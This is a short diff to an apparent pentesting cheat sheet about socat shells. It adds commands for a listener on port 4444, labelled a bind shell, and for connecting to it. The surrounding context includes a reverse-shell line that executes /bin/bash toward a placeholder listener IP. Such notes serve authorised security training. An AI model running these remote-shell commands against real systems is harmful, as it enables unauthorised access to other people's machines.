@@ -17,6 +17,14 @@ $ sudo sudo socat TCP4-LISTEN:443 STDOUT
 [Kali] socat TCP:<listener ip address>:443 EXEC:/bin/bash
 ```
 
+```bash 
+# Create a SOCAT bind shell
+socat -d -d TCP4-LISTEN:4444 STDOUT
+
+# Connect to the SOCAT bind shell
+socat - TCP:$IP:4444
+```
+
 ```bash
 # Encrpted bind shells (Create cert, set up listener, connect to shell)
 # Use OpenSSL to create a self-signed cert
